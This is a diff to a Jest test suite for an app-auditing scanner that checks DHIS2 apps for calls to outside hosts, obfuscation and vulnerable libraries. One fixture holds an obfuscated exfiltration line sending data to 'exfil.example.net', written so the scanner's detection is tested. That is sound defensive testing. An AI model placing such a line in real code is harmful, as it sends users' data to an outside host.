@@ -2,7 +2,12 @@ import { installWebCrypto, removeWebCrypto } from '../../testUtils/webCrypto'
 import { runAppsAudit } from './runAppsAudit'
 import { __setAnalyzerForTests } from '../../utils/jsXRay'
 
+// The shipped default: the code analysis is off, so most tests exercise the
+// path a real instance takes.
 const TEST_CONFIG = { maxAppAuditConcurrency: 4 }
+
+// For the tests that are specifically about the analysis.
+const ANALYSIS_ON = { ...TEST_CONFIG, enableCodeAnalysis: true }
 
 const makeEngine = (apps) => ({
     query: jest.fn(async () => ({ apps })),
@@ -51,6 +56,61 @@ describe('runAppsAudit', () => {
         expect(results[1].status).toBe('pass')
     })
 
+    // End-to-end proof that the external-endpoint check survives the whole
+    // chain: fileProcessor -> scanApp -> summarize -> resultStatus. The check
+    // runs with the code analysis off, which is the shipped default, because
+    // it works on raw text and needs no parser.
+    it('flags an app that can connect to a host outside the instance', async () => {
+        const engine = makeEngine([
+            {
+                key: 'sketchy',
+                name: 'Sketchy',
+                baseUrl: 'https://server/dhis/api/apps/sketchy',
+            },
+        ])
+        const fetchText = makeFetchText({
+            'https://server/dhis/api/apps/sketchy/index.html?redirect=false':
+                '<script src="main.js"></script>',
+            // Written the way an obfuscator would, to prove normalization is
+            // part of the shipped path and not just of the unit tests.
+            'https://server/dhis/api/apps/sketchy/main.js':
+                'fetch("https:\\u002f\\u002fexfil.example.net/collect",{body:d})',
+        })
+        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
+            fetchText,
+            instanceHost: 'server',
+        })
+        expect(result.status).toBe('warning')
+        expect(result.external.reachableCount).toBe(1)
+        expect(result.external.hosts[0]).toMatchObject({
+            host: 'exfil.example.net',
+            reachable: true,
+        })
+        expect(result.external.sinks).toContain('fetch')
+    })
+
+    it('leaves an app that only talks to its own instance alone', async () => {
+        const engine = makeEngine([
+            {
+                key: 'tidy',
+                name: 'Tidy',
+                baseUrl: 'https://server/dhis/api/apps/tidy',
+            },
+        ])
+        const fetchText = makeFetchText({
+            'https://server/dhis/api/apps/tidy/index.html?redirect=false':
+                '<script src="main.js"></script>',
+            'https://server/dhis/api/apps/tidy/main.js':
+                'fetch("https://server/dhis/api/me");var ns="http://www.w3.org/2000/svg"',
+        })
+        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
+            fetchText,
+            instanceHost: 'server',
+        })
+        expect(result.status).toBe('pass')
+        expect(result.external).toMatchObject({ status: 'pass', hosts: [] })
+    })
+
     it('honors maxAppAuditConcurrency (no more than N in flight)', async () => {
         let active = 0
         let peak = 0
@@ -91,7 +151,7 @@ describe('runAppsAudit', () => {
         })
         const [result] = await runAppsAudit(
             engine,
-            TEST_CONFIG,
+            ANALYSIS_ON,
             {},
             { analyze: obfuscatedAnalyze, fetchText }
         )
@@ -404,7 +464,7 @@ describe('runAppsAudit', () => {
                 { kind: 'short-identifiers', value: 1.39 },
             ],
         })
-        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
+        const [result] = await runAppsAudit(engine, ANALYSIS_ON, {}, {
             analyze: vendorAnalyze,
             fetchText: makeFetchText({
                 'https://server/api/apps/normal/index.html?redirect=false':
@@ -742,7 +802,7 @@ describe('runAppsAudit', () => {
         const engine = makeEngine([
             { key: 'a', baseUrl: 'https://server/api/apps/a' },
         ])
-        const [result] = await runAppsAudit(engine, TEST_CONFIG, { onWorker }, {
+        const [result] = await runAppsAudit(engine, ANALYSIS_ON, { onWorker }, {
             analyze: cleanAnalyze,
             fetchText: makeFetchText({
                 'https://server/api/apps/a/index.html?redirect=false':
@@ -778,7 +838,52 @@ describe('runAppsAudit', () => {
         expect(processFile).toHaveBeenCalled()
         expect(result.files[0].error).toMatch(/Analyzer failed/)
         expect(result.files[0].hash).toBe('abc')
-        expect(result.status).toBe('error')
+        // A parse failure is missing information, not a finding: it marks the
+        // scan incomplete rather than changing the assessment.
+        expect(result.files[0].incomplete).toBe(true)
+        expect(result.status).toBe('pass')
+    })
+
+    it('skips the code analysis by default, keeping the checks that matter', async () => {
+        // Off by default: on minified bundles the analysis cannot support a
+        // verdict, and it is the dominant cost of a scan. Library detection
+        // and hashing need no parser and are unaffected.
+        const analyze = jest.fn(() => ({
+            warnings: [{ kind: 'obfuscated-code', value: 'jsfuck' }],
+        }))
+        const engine = makeEngine([
+            { key: 'a', baseUrl: 'https://server/api/apps/a' },
+        ])
+        const [result] = await runAppsAudit(engine, TEST_CONFIG, {}, {
+            analyze,
+            retireRepository: {
+                components: {
+                    lodash: {
+                        extractors: {
+                            filecontentreplace: [
+                                '/VERSION *= *[\'"]([0-9][0-9.a-z_\\-]+)[\'"]/$1/',
+                            ],
+                        },
+                        vulnerabilities: [
+                            { below: '4.18.0', severity: 'high', identifiers: {} },
+                        ],
+                    },
+                },
+            },
+            fetchText: makeFetchText({
+                'https://server/api/apps/a/index.html?redirect=false':
+                    '<script src="./main.js"></script>',
+                'https://server/api/apps/a/main.js': 'var VERSION="4.17.21";',
+            }),
+        })
+        expect(analyze).not.toHaveBeenCalled()
+        expect(result.files[0].warnings).toBeUndefined()
+        // Not a gap: nothing was meant to be examined, so the app is not
+        // reported as partially examined.
+        expect(result.files[0].incomplete).toBeUndefined()
+        // The library check still ran, and still sets the verdict.
+        expect(result.files[0].libraries[0].component).toBe('lodash')
+        expect(result.status).toBe('fail')
     })
 
     it('handles a /api/apps fetch failure without throwing', async () => {
